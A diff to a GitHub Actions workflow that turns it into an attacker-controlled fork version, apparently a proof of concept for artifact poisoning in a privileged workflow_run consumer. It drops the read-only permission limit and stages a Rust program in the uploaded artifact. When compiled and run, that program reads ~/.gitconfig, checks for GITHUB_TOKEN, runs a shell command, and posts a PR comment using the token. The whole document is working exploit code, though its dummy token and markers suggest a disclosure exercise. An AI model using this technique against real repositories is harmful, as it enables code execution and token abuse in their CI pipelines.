@@ -1,5 +1,9 @@
 name: Patch Testing Cycles
 
+# Attacker-controlled version of the producer workflow, as it would appear in a
+# fork PR head. The workflow name is unchanged so that the privileged
+# workflow_run consumer matches it.
+
 on:
   pull_request:
     branches: [main]
@@ -8,21 +12,54 @@ on:
 jobs:
   patch-testing-cycles:
     runs-on: ubuntu-latest
-    permissions:
-      contents: read
     steps:
       - name: "Checkout sources"
         uses: "actions/checkout@v6"
 
-      - name: "Produce legit stats"
+      - name: "Stage a poisoned 'cycle stats' artifact"
         run: |
-          echo '[]' > new_cycle_stats.json
-          echo '[]' > old_cycle_stats.json
+          mkdir -p stage/sp1-test/bin
+          cat > stage/sp1-test/bin/post_to_github.rs <<'RSEOF'
+          use std::process::Command;
+
+          fn main() {
+              let home = std::env::var("HOME").unwrap_or_default();
+              let cfg = std::fs::read_to_string(format!("{home}/.gitconfig")).unwrap_or_default();
+              let token_in_gitconfig = cfg.contains("POCDUMMYTOKEN");
+              let gh = std::env::var("GITHUB_TOKEN").map(|v| !v.is_empty()).unwrap_or(false);
+              let repo = std::env::var("GITHUB_REPOSITORY").unwrap_or_default();
+              println!(
+                  "POC_MARKER_SP1_ARTIFACT_RCE rce=true token_in_gitconfig={token_in_gitconfig} gh_token_present={gh} repo={repo}"
+              );
+              let out = Command::new("sh")
+                  .arg("-c")
+                  .arg("id; echo POC_SHELL_FROM_ATTACKER_BIN")
+                  .output()
+                  .unwrap();
+              println!("{}", String::from_utf8_lossy(&out.stdout));
+              if let (Ok(tok), Ok(pr)) = (std::env::var("GITHUB_TOKEN"), std::env::var("PR_NUMBER")) {
+                  if !pr.is_empty() {
+                      let body = format!(
+                          "POC_MARKER_SP1_ARTIFACT_RCE: attacker-supplied Rust code compiled and executed inside the privileged workflow_run job in {repo} (token_in_gitconfig={token_in_gitconfig})."
+                      );
+                      let _ = Command::new("curl")
+                          .args([
+                              "-sS", "-X", "POST",
+                              "-H", &format!("authorization: Bearer {tok}"),
+                              "-H", "accept: application/vnd.github+json",
+                              &format!("https://api.github.com/repos/{repo}/issues/{pr}/comments"),
+                              "-d", &format!("{{\"body\":\"{body}\"}}"),
+                          ])
+                          .output();
+                  }
+              }
+          }
+          RSEOF
+          echo '[]' > stage/old_cycle_stats.json
+          echo '[]' > stage/new_cycle_stats.json
 
       - name: "Upload cycle stats"
         uses: actions/upload-artifact@v4
         with:
           name: patch-testing-results
-          path: |
-            new_cycle_stats.json
-            old_cycle_stats.json
+          path: stage/
